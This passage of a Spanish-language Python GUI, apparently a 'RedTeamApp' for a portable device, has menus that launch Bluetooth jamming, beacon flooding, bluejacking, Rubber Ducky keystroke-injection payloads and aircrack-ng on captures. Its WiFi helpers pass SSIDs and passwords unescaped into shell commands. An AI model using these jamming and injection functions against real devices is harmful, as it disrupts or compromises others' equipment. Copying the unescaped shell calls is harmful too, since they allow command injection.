        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        for carpeta in carpetas:
            ruta = os.path.join(base_dir, carpeta)
            btn = ctk.CTkButton(frame, text=carpeta, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
                               command=lambda r=ruta: self._mostrar_archivos_generico(r, callback_volver))
            btn.pack(fill="x", pady=3)
        self.mostrar_consola()

    def _mostrar_archivos_generico(self, ruta, callback_volver):
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._mostrar_explorador_generico(os.path.dirname(ruta), "", callback_volver))
        nombre = os.path.basename(ruta)
        ctk.CTkLabel(self.main_frame, text=f"ARCHIVOS EN {nombre}", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        archivos = sorted([f for f in os.listdir(ruta) if os.path.isfile(os.path.join(ruta, f))])
        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        for archivo in archivos:
            ruta_arch = os.path.join(ruta, archivo)
            if archivo.endswith('.cap'):
                btn = ctk.CTkButton(frame, text=f"{archivo} (Info)", fg_color="#2b2b2b",
                                   command=lambda ra=ruta_arch: self.ejecutar_comando(f"aircrack-ng '{ra}'"))
            else:
                btn = ctk.CTkButton(frame, text=archivo, fg_color="#2b2b2b",
                                   command=lambda ra=ruta_arch: self.ejecutar_comando(f"less '{ra}'"))
            btn.pack(fill="x", pady=3)
        self.mostrar_consola()

 
    # ==========================================
    # MENÚ BLUETOOTH
    # ==========================================
    def show_bluetooth_menu(self):
        self.limpiar_main_frame()
        ctk.CTkLabel(self.main_frame, text="AUDITORÍA BLUETOOTH BLE",
                     font=ctk.CTkFont(size=20, weight="bold")).pack(pady=(10,15))

        # Indicador de estado del gadget
        gadget_status = "Conectado" if self.gadget_available else "Desconectado"
        ctk.CTkLabel(self.main_frame, text=f"Gadget ESP32: {gadget_status}",
                     text_color="#00ff00" if self.gadget_available else "#ff4d4d",
                     font=ctk.CTkFont(size=12)).pack(pady=(0,10))

        if self.gadget_available:
            # --- OPCIONES CON GADGET ---
            btn_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
            btn_frame.pack(fill="x", padx=20, pady=5)

            ctk.CTkButton(btn_frame, text="Escanear BLE (HSPI)", fg_color=COLOR_BOTON_ROJO,
                          hover_color=COLOR_BOTON_HOVER, height=40,
                          command=lambda: self._ble_scan_gadget(0)).pack(fill="x", pady=5)
            ctk.CTkButton(btn_frame, text="Escanear BLE (VSPI)", fg_color=COLOR_BOTON_ROJO,
                          hover_color=COLOR_BOTON_HOVER, height=40,
                          command=lambda: self._ble_scan_gadget(1)).pack(fill="x", pady=5)
            ctk.CTkButton(btn_frame, text="Bluejacking (Enviar mensaje)", fg_color=COLOR_BOTON_ROJO,
                          hover_color=COLOR_BOTON_HOVER, height=40,
                          command=self._bluejacking_gui).pack(fill="x", pady=5)
            ctk.CTkButton(btn_frame, text="Beacon Flooding (Saturación)", fg_color=COLOR_BOTON_ROJO,
                          hover_color=COLOR_BOTON_HOVER, height=40,
                          command=self._beacon_flood_gui).pack(fill="x", pady=5)
            ctk.CTkButton(btn_frame, text="Jammer Bluetooth", fg_color=COLOR_BOTON_ROJO,
                          hover_color=COLOR_BOTON_HOVER, height=40,
                          command=self._jammer_gui).pack(fill="x", pady=5)
            ctk.CTkButton(btn_frame, text="Detener todo (Gadget)", fg_color=COLOR_BOTON_PELIGRO,
                          hover_color="#cc7a00", height=40,
                          command=self._gadget_stop_all).pack(fill="x", pady=5)
            ctk.CTkButton(btn_frame, text="Estado del Gadget", fg_color="#4a4a4a",
                          hover_color="#2b2b2b", height=40,
                          command=self._gadget_status).pack(fill="x", pady=5)
        else:
            # --- MODO LEGACY (bluetoothctl) ---
            ctk.CTkButton(self.main_frame, text="Escanear Dispositivos BLE", fg_color=COLOR_BOTON_ROJO,
                          hover_color=COLOR_BOTON_HOVER, height=40,
                          command=self._ble_escanear).pack(fill="x", padx=40, pady=8)

        # Opción común para ambos modos
        ctk.CTkButton(self.main_frame, text="Explorar Resultados BLE", fg_color="#4a4a4a",
                      hover_color="#2b2b2b", height=40,
                      command=lambda: self._mostrar_explorador_generico(BASE_DIR_BLE, "RESULTADOS BLE", self.show_bluetooth_menu)
                      ).pack(fill="x", padx=40, pady=8)

        self.mostrar_consola()

    # ==========================================
    # NUEVOS MÉTODOS DE ATAQUE CON GADGET
    # ==========================================
    def _ble_scan_gadget(self, module):
        """Escanea BLE usando el módulo indicado del gadget."""
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_bluetooth_menu)
        ctk.CTkLabel(self.main_frame, text=f"ESCANEANDO BLE (MÓDULO {module})...",
                     font=ctk.CTkFont(size=16)).pack(pady=10)
        self.mostrar_consola()
        self.escribir_consola(f"[*] Iniciando escaneo con módulo {module} (duración 10s)...")

        def callback(devices):
            self.after(0, lambda: self._ble_gadget_mostrar_dispositivos(devices, module))
        self.gadget.scan(module, 10, callback)

    def _ble_gadget_mostrar_dispositivos(self, dispositivos, module):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_bluetooth_menu)
        ctk.CTkLabel(self.main_frame, text="DISPOSITIVOS ENCONTRADOS (Gadget)",
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        if not dispositivos:
            ctk.CTkLabel(self.main_frame, text="No se encontraron dispositivos.").pack()
            return
        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        for dev in dispositivos:
            texto = f"{dev['name'][:30]}  ({dev['mac']})  RSSI:{dev['rssi']}"
            btn = ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b",
                                hover_color=COLOR_BOTON_HOVER,
                                command=lambda d=dev: self._ble_acciones(d))
            btn.pack(fill="x", pady=3)
        self.mostrar_consola()

    def _bluejacking_gui(self):
        """Interfaz para enviar un mensaje de publicidad BLE (bluejacking)."""
        dialog = ctk.CTkInputDialog(text="Mensaje a enviar en advertising:", title="Bluejacking")
        msg = dialog.get_input()
        if msg:
            # Usar módulo 0 por defecto
            self.escribir_consola(f"[*] Enviando publicidad: {msg}")
            self.gadget.advertise(0, msg)
            # Botón para detener (agregar a la interfaz actual)
            self.limpiar_main_frame()
            self.agregar_boton_atras(self.show_bluetooth_menu)
            ctk.CTkLabel(self.main_frame, text="Publicidad activa. Mensaje: " + msg,
                         font=ctk.CTkFont(size=14)).pack(pady=20)
            ctk.CTkButton(self.main_frame, text="Detener Publicidad", fg_color=COLOR_BOTON_PELIGRO,
                          command=lambda: self.gadget.stop(0)).pack(pady=10)
            self.mostrar_consola()

    def _beacon_flood_gui(self):
        """Configura y lanza un ataque de beacon flooding."""
        dialog_count = ctk.CTkInputDialog(text="Cantidad de beacons:", title="Beacon Flood")
        count_str = dialog_count.get_input()
        if not count_str:
            count = 50
        else:
            count = int(count_str)
        dialog_interval = ctk.CTkInputDialog(text="Intervalo (ms):", title="Beacon Flood")
        interval_str = dialog_interval.get_input()
        if not interval_str:
            interval = 200
        else:
            interval = int(interval_str)

        self.escribir_consola(f"[*] Iniciando beacon flood: {count} beacons cada {interval}ms")
        self.gadget.beacon_flood(0, count, interval)
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_bluetooth_menu)
        ctk.CTkLabel(self.main_frame, text=f"Flood en curso: {count} beacons.", font=ctk.CTkFont(size=14)).pack(pady=20)
        ctk.CTkButton(self.main_frame, text="Detener Flood", fg_color=COLOR_BOTON_PELIGRO,
                      command=lambda: self.gadget.stop(0)).pack(pady=10)
        self.mostrar_consola()

    def _jammer_gui(self):
        """Activa jammer en un canal BLE específico."""
        dialog_ch = ctk.CTkInputDialog(text="Canal (0-78):", title="Jammer BLE")
        ch_str = dialog_ch.get_input()
        if not ch_str:
            return
        channel = int(ch_str)
        dialog_dur = ctk.CTkInputDialog(text="Duración (segundos):", title="Jammer BLE")
        dur_str = dialog_dur.get_input()
        if not dur_str:
            return
        duration = int(dur_str)

        self.escribir_consola(f"[*] Iniciando jamming en canal {channel} por {duration}s")
        self.gadget.jam(0, channel, duration)
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_bluetooth_menu)
        ctk.CTkLabel(self.main_frame, text=f"Jamming en canal {channel}...", font=ctk.CTkFont(size=14)).pack(pady=20)
        ctk.CTkButton(self.main_frame, text="Detener Jammer", fg_color=COLOR_BOTON_PELIGRO,
                      command=lambda: self.gadget.stop(0)).pack(pady=10)
        self.mostrar_consola()

    def _gadget_stop_all(self):
        """Detiene cualquier operación en ambos módulos del gadget."""
        self.escribir_consola("[*] Deteniendo módulos del gadget...")
        self.gadget.stop(0)
        self.gadget.stop(1)

    def _gadget_status(self):
        """Muestra el estado de los módulos del gadget."""
        if self.gadget_available:
            status = self.gadget.status()
            self.escribir_consola(f"[+] Estado gadget: {status}")
        else:
            self.escribir_consola("[!] Gadget no disponible.")


    # ==========================================
    # MENÚ RUBBER DUCKY
    # ==========================================
    def show_ducky_menu(self):
        self.limpiar_main_frame()
        ctk.CTkLabel(self.main_frame, text="RUBBER DUCKY PAYLOADS", font=ctk.CTkFont(size=20, weight="bold")).pack(pady=(10,15))
        payloads_dir = "payloads"
        os.makedirs(payloads_dir, exist_ok=True)
        archivos = [f for f in os.listdir(payloads_dir) if f.endswith(".txt")]
        if not archivos:
            ctk.CTkLabel(self.main_frame, text="No hay payloads en la carpeta 'payloads/'.").pack(pady=20)
            return
        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        for archivo in archivos:
            ruta = os.path.join(payloads_dir, archivo)
            btn = ctk.CTkButton(frame, text=archivo, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
                               command=lambda r=ruta: self._ejecutar_ducky(r))
            btn.pack(fill="x", pady=5)
        self.mostrar_consola()

    def _ejecutar_ducky(self, ruta):
        self.escribir_consola(f"\n[+] Ejecutando payload: {os.path.basename(ruta)}")
        self.escribir_consola("[!] Tienes 2 segundos para situar el cursor...")
        def run():
            time.sleep(2)
            try:
                ducky_logic.ejecutar_script_ducky(ruta)
                self.escribir_consola("[+] Payload finalizado.")
            except Exception as e:
                self.escribir_consola(f"[!] Error: {e}")
        threading.Thread(target=run, daemon=True).start()

    # ==========================================
    # MENÚ UTILIDADES 
    # ==========================================
    def show_utils_menu(self):
        self.limpiar_main_frame()
        ctk.CTkLabel(self.main_frame, text="UTILIDADES DEL SISTEMA", 
                     font=ctk.CTkFont(size=20, weight="bold")).pack(pady=(10, 15))

        # Sección WiFi
        wifi_frame = ctk.CTkFrame(self.main_frame, fg_color=COLOR_FONDO_PRINCIPAL, border_width=1, border_color="#333")
        wifi_frame.pack(fill="x", padx=20, pady=10)
        ctk.CTkLabel(wifi_frame, text="CONECTIVIDAD WiFi", font=ctk.CTkFont(size=16, weight="bold"),
                     text_color="#ff4d4d").pack(pady=5)
        ctk.CTkButton(wifi_frame, text="Seleccionar Interfaz y Conectar a Red", 
                     fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=40,
                     command=self._utils_wifi_seleccionar_interfaz).pack(fill="x", padx=40, pady=5)
        ctk.CTkButton(wifi_frame, text="Ver Estado WiFi Actual", 
                     fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=40,
                     command=self._utils_wifi_estado).pack(fill="x", padx=40, pady=5)

        # Sección Bluetooth
        bt_frame = ctk.CTkFrame(self.main_frame, fg_color=COLOR_FONDO_PRINCIPAL, border_width=1, border_color="#333")
        bt_frame.pack(fill="x", padx=20, pady=10)
        ctk.CTkLabel(bt_frame, text="CONECTIVIDAD BLUETOOTH", font=ctk.CTkFont(size=16, weight="bold"),
                     text_color="#ff4d4d").pack(pady=5)
        ctk.CTkButton(bt_frame, text="Seleccionar Adaptador y Conectar Dispositivo", 
                     fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=40,
                     command=self._utils_bluetooth_seleccionar_interfaz).pack(fill="x", padx=40, pady=5)
        ctk.CTkButton(bt_frame, text="Ver Estado Bluetooth", 
                     fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=40,
                     command=self._utils_bluetooth_estado).pack(fill="x", padx=40, pady=5)

        # Sección comandos rápidos
        ctk.CTkLabel(self.main_frame, text="MONITOREO DEL SISTEMA", 
                     font=ctk.CTkFont(size=16, weight="bold"), text_color="#ff4d4d").pack(pady=(10,5))
        btn_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        btn_frame.pack(fill="x", padx=15, pady=5)
        btn_frame.grid_columnconfigure((0,1), weight=1)
        comandos_sys = [
            ("Uso de Almacenamiento", "df -h"),
            ("Uso de RAM", "free -h"),
            ("Top Procesos CPU", "ps aux --sort=-%cpu | head -6"),
            ("Conexiones Activas", "ss -tulnp | head -10")
        ]
        for i, (nombre, cmd) in enumerate(comandos_sys):
            row = i // 2
            col = i % 2
            ctk.CTkButton(btn_frame, text=nombre, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
                         command=lambda c=cmd: self.ejecutar_comando(c)).grid(row=row, column=col, padx=5, pady=5, sticky="ew")

        # Botones de apagado/reinicio
        ctk.CTkButton(self.main_frame, text="REINICIAR SISTEMA", fg_color=COLOR_BOTON_PELIGRO, width=200,
                     command=lambda: os.system("reboot")).pack(pady=10)
        ctk.CTkButton(self.main_frame, text="APAGAR SISTEMA", fg_color=COLOR_BOTON_PELIGRO, width=200,
                     command=lambda: os.system("shutdown -h now")).pack(pady=5)
        ctk.CTkButton(self.main_frame, text="CERRAR INTERFAZ (SALIR)", fg_color="#4a4a4a", hover_color="#2b2b2b", width=200,
                     command=self.destroy).pack(pady=15)

        self.mostrar_consola()

    # -------------------- UTILIDADES WiFi --------------------
    def obtener_interfaces_wifi(self):
        """Devuelve lista de interfaces inalámbricas usando iw dev"""
        interfaces = []
        try:
            output = subprocess.check_output("iw dev | grep Interface", shell=True, text=True)
            for line in output.splitlines():
                iface = line.split()[-1]
                interfaces.append(iface)
        except:
            pass
        return interfaces if interfaces else []

    def _utils_wifi_seleccionar_interfaz(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_utils_menu)
        ctk.CTkLabel(self.main_frame, text="SELECCIONA INTERFAZ WiFi", 
                     font=ctk.CTkFont(size=18, weight="bold")).pack(pady=20)
        interfaces = self.obtener_interfaces_wifi()
        if not interfaces:
            ctk.CTkLabel(self.main_frame, text="No se detectaron interfaces WiFi.", text_color="red").pack(pady=10)
            ctk.CTkButton(self.main_frame, text="Volver a Utilidades", command=self.show_utils_menu).pack(pady=10)
            return
        for iface in interfaces:
            ctk.CTkButton(self.main_frame, text=iface, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=40,
                         command=lambda i=iface: self._utils_wifi_escanear_redes(i)).pack(fill="x", padx=40, pady=5)
        self.mostrar_consola()

    def _utils_wifi_escanear_redes(self, iface):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_wifi_seleccionar_interfaz)
        ctk.CTkLabel(self.main_frame, text=f"ESCANEANDO REDES CON {iface}...", 
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=20)
        self.mostrar_consola()
        self.escribir_consola(f"[*] Iniciando escaneo con interfaz {iface}...")

        def escanear():
            # Rescan
            os.system(f"nmcli device wifi rescan ifname {iface} 2>/dev/null")
            time.sleep(2)
            # Obtener lista de redes
            try:
                output = subprocess.check_output(
                    f"nmcli -t -f SSID,SECURITY,SIGNAL device wifi list ifname {iface}",
                    shell=True, text=True, stderr=subprocess.DEVNULL
                )
                redes = []
                for line in output.strip().split('\n'):
                    if not line.strip():
                        continue
                    parts = line.split(':')
                    if len(parts) >= 3:
                        ssid = parts[0] if parts[0] else "<Oculta>"
                        security = parts[1] if parts[1] else "Ninguna"
                        signal = parts[2]
                        redes.append({"ssid": ssid, "security": security, "signal": signal})
                self.after(0, lambda: self._utils_wifi_mostrar_redes(iface, redes))
            except Exception as e:
                self.escribir_consola(f"[!] Error durante el escaneo: {e}")
                self.after(0, lambda: self._utils_wifi_mostrar_redes(iface, []))
        threading.Thread(target=escanear, daemon=True).start()

    def _utils_wifi_mostrar_redes(self, iface, redes):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_wifi_seleccionar_interfaz)
        ctk.CTkLabel(self.main_frame, text="REDES DISPONIBLES", 
                     font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
        if not redes:
            ctk.CTkLabel(self.main_frame, text="No se encontraron redes.").pack(pady=20)
            return
        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        for red in redes:
            texto = f"{red['ssid']}  |  Seguridad: {red['security']}  |  Señal: {red['signal']}%"
            btn = ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
                               command=lambda r=red: self._utils_wifi_conectar(iface, r['ssid'], r['security']))
            btn.pack(fill="x", pady=3)
        self.mostrar_consola()

    def _utils_wifi_conectar(self, iface, ssid, security):
        # Si la red tiene seguridad, pedir contraseña
        if security and security.lower() != "none" and "wep" not in security.lower():
            dialog = ctk.CTkInputDialog(text=f"Introduce la contraseña para '{ssid}':", title="Contraseña WiFi")
            password = dialog.get_input()
            if not password:
                self.escribir_consola("[!] Conexión cancelada (sin contraseña).")
                return
        else:
            password = None

        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._utils_wifi_escanear_redes(iface))
        ctk.CTkLabel(self.main_frame, text=f"CONECTANDO A '{ssid}'...", 
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=20)
        self.mostrar_consola()
        self.escribir_consola(f"[*] Intentando conectar a '{ssid}' con interfaz {iface}...")

        def conectar():
            try:
                if password:
                    cmd = f"nmcli device wifi connect '{ssid}' password '{password}' ifname {iface}"
                else:
                    cmd = f"nmcli device wifi connect '{ssid}' ifname {iface}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    # Verificar estado
                    state_out = subprocess.check_output(f"nmcli -t -f GENERAL.STATE dev show {iface}", shell=True, text=True)
                    if "100 (connected)" in state_out:
                        self.escribir_consola(f"[+] Conexión exitosa a '{ssid}'.")
                        estado = "ÉXITO: Conectado correctamente."
                    else:
                        self.escribir_consola(f"[!] Conexión realizada pero estado no confirmado.")
                        estado = "ADVERTENCIA: Estado no verificado."
                else:
                    self.escribir_consola(f"[!] Error al conectar: {result.stderr}")
                    estado = f"ERROR: {result.stderr.strip()}"
            except Exception as e:
                self.escribir_consola(f"[!] Excepción: {e}")
                estado = f"EXCEPCIÓN: {e}"
            self.after(0, lambda: self._utils_wifi_mostrar_resultado(estado, iface))
        threading.Thread(target=conectar, daemon=True).start()

    def _utils_wifi_mostrar_resultado(self, mensaje, iface):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_wifi_seleccionar_interfaz)
        ctk.CTkLabel(self.main_frame, text="RESULTADO DE CONEXIÓN", 
                     font=ctk.CTkFont(size=18, weight="bold")).pack(pady=20)
        ctk.CTkLabel(self.main_frame, text=mensaje, wraplength=500).pack(pady=10)
        ctk.CTkButton(self.main_frame, text="Volver a Utilidades", 
                     fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
                     command=self.show_utils_menu).pack(pady=20)
        self.mostrar_consola()

    def _utils_wifi_estado(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_utils_menu)
        ctk.CTkLabel(self.main_frame, text="ESTADO WiFi ACTUAL", 
                     font=ctk.CTkFont(size=18, weight="bold")).pack(pady=20)
        self.mostrar_consola()
        interfaces = self.obtener_interfaces_wifi()
        if not interfaces:
            self.escribir_consola("[!] No se encontraron interfaces WiFi.")
            return
        for iface in interfaces:
            self.ejecutar_comando(f"nmcli -t -f GENERAL.STATE,IP4.ADDRESS dev show {iface} | head -2")

    # -------------------- UTILIDADES BLUETOOTH --------------------
    def obtener_interfaces_bluetooth(self):
        """Devuelve lista de adaptadores Bluetooth (hciX) usando hciconfig"""
        interfaces = []
        try:
            output = subprocess.check_output("hciconfig -a | grep 'hci'", shell=True, text=True)
            for line in output.splitlines():
                if "hci" in line:
                    iface = line.split(':')[0].strip()
                    interfaces.append(iface)
        except:
            pass
        return interfaces if interfaces else []

    def _utils_bluetooth_seleccionar_interfaz(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_utils_menu)
        ctk.CTkLabel(self.main_frame, text="SELECCIONA ADAPTADOR BLUETOOTH", 
                     font=ctk.CTkFont(size=18, weight="bold")).pack(pady=20)
        interfaces = self.obtener_interfaces_bluetooth()
        if not interfaces:
            ctk.CTkLabel(self.main_frame, text="No se detectaron adaptadores Bluetooth.", text_color="red").pack(pady=10)
            ctk.CTkButton(self.main_frame, text="Volver a Utilidades", command=self.show_utils_menu).pack(pady=10)
            return
        for iface in interfaces:
            ctk.CTkButton(self.main_frame, text=iface, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=40,
                         command=lambda i=iface: self._utils_bluetooth_escanear(i)).pack(fill="x", padx=40, pady=5)
        self.mostrar_consola()

    def _utils_bluetooth_escanear(self, iface):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_bluetooth_seleccionar_interfaz)
        ctk.CTkLabel(self.main_frame, text=f"ESCANEANDO DISPOSITIVOS BLUETOOTH ({iface})...", 
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=20)
        self.mostrar_consola()
        self.escribir_consola(f"[*] Preparando adaptador {iface} y escaneando durante 12 segundos...")

        def escanear():
            # Asegurar que el adaptador esté up, discoverable, pairable
            os.system(f"sudo hciconfig {iface} up 2>/dev/null")
            os.system(f"sudo bluetoothctl -- select {iface} 2>/dev/null")
            os.system(f"sudo bluetoothctl -- power on 2>/dev/null")
            os.system(f"sudo bluetoothctl -- discoverable on 2>/dev/null")
            os.system(f"sudo bluetoothctl -- pairable on 2>/dev/null")
            # Iniciar escaneo en background
            os.system(f"sudo bluetoothctl -- scan on &")
            time.sleep(12)
            # Detener escaneo
            os.system(f"sudo bluetoothctl -- scan off 2>/dev/null")
            time.sleep(1)
            # Obtener dispositivos
            dispositivos = []
            try:
                output = subprocess.check_output(f"sudo bluetoothctl -- devices", shell=True, text=True)
                for line in output.splitlines():
                    if "Device" in line:
                        parts = line.strip().split(' ', 2)
                        if len(parts) >= 3:
                            mac = parts[1]
                            nombre = parts[2]
                            dispositivos.append({"mac": mac, "nombre": nombre})
            except Exception as e:
                self.escribir_consola(f"[!] Error listando dispositivos: {e}")
            self.after(0, lambda: self._utils_bluetooth_mostrar_dispositivos(iface, dispositivos))
        threading.Thread(target=escanear, daemon=True).start()

    def _utils_bluetooth_mostrar_dispositivos(self, iface, dispositivos):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_bluetooth_seleccionar_interfaz)
        ctk.CTkLabel(self.main_frame, text="DISPOSITIVOS ENCONTRADOS", 
                     font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
        if not dispositivos:
            ctk.CTkLabel(self.main_frame, text="No se encontraron dispositivos.").pack(pady=20)
            return
        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        for dev in dispositivos:
            texto = f"{dev['nombre']}  ({dev['mac']})"
            btn = ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
                               command=lambda d=dev: self._utils_bluetooth_conectar(iface, d['mac'], d['nombre']))
            btn.pack(fill="x", pady=3)
        self.mostrar_consola()

    def _utils_bluetooth_conectar(self, iface, mac, nombre):
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._utils_bluetooth_escanear(iface))
        ctk.CTkLabel(self.main_frame, text=f"CONECTANDO A '{nombre}'", 
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=20)
        self.mostrar_consola()
        self.escribir_consola(f"[*] Intentando emparejar y conectar a {mac}...")

        def conectar():
            try:
                # Emparejar
                pair = subprocess.run(f"sudo bluetoothctl -- pair {mac}", shell=True, capture_output=True, text=True, timeout=30)
                if "Pairing successful" in pair.stdout or "Paired: yes" in pair.stdout:
                    self.escribir_consola("[+] Emparejamiento exitoso.")
                    # Conectar
                    connect = subprocess.run(f"sudo bluetoothctl -- connect {mac}", shell=True, capture_output=True, text=True, timeout=30)
                    if "Connection successful" in connect.stdout or "Connected: yes" in connect.stdout:
                        self.escribir_consola(f"[+] Conectado a {nombre}.")
                        estado = f"ÉXITO: Conectado a {nombre}."
                    else:
                        self.escribir_consola(f"[!] Error en conexión: {connect.stderr}")
                        estado = f"ERROR: {connect.stderr.strip()}"
                else:
                    self.escribir_consola(f"[!] Fallo en emparejamiento: {pair.stderr}")
                    estado = f"ERROR: {pair.stderr.strip()}"
            except Exception as e:
                self.escribir_consola(f"[!] Excepción: {e}")
                estado = f"EXCEPCIÓN: {e}"
            self.after(0, lambda: self._utils_bt_mostrar_resultado(estado))
        threading.Thread(target=conectar, daemon=True).start()

    def _utils_bt_mostrar_resultado(self, mensaje):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_bluetooth_seleccionar_interfaz)
        ctk.CTkLabel(self.main_frame, text="RESULTADO DE CONEXIÓN BLUETOOTH", 
                     font=ctk.CTkFont(size=18, weight="bold")).pack(pady=20)
        ctk.CTkLabel(self.main_frame, text=mensaje, wraplength=500).pack(pady=10)
        ctk.CTkButton(self.main_frame, text="Volver a Utilidades", 
                     fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
                     command=self.show_utils_menu).pack(pady=20)
        self.mostrar_consola()

    def _utils_bluetooth_estado(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_utils_menu)
        ctk.CTkLabel(self.main_frame, text="ESTADO BLUETOOTH", 
                     font=ctk.CTkFont(size=18, weight="bold")).pack(pady=20)
        self.mostrar_consola()
        interfaces = self.obtener_interfaces_bluetooth()
        if not interfaces:
            self.escribir_consola("[!] No se encontraron adaptadores Bluetooth.")
            return
        for iface in interfaces:
            self.ejecutar_comando(f"hciconfig {iface} -a")
            self.ejecutar_comando(f"bluetoothctl -- show {iface}")

if __name__ == "__main__":
    app = RedTeamApp()
    app.mainloop()